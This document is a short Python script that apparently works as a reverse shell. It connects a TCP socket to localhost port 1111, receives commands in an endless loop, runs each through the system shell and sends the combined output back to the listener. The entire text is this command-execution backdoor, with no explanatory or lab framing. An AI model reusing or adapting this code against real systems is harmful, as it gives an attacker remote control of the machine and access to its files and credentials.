import os, socket, subprocess

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("localhost", 1111))

while True:
    cmd = s.recv(1024).decode()
    out, err = subprocess.Popen(cmd, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE).communicate() 
    print(out+err, cmd)
    s.send(out+err+b"\n")
		
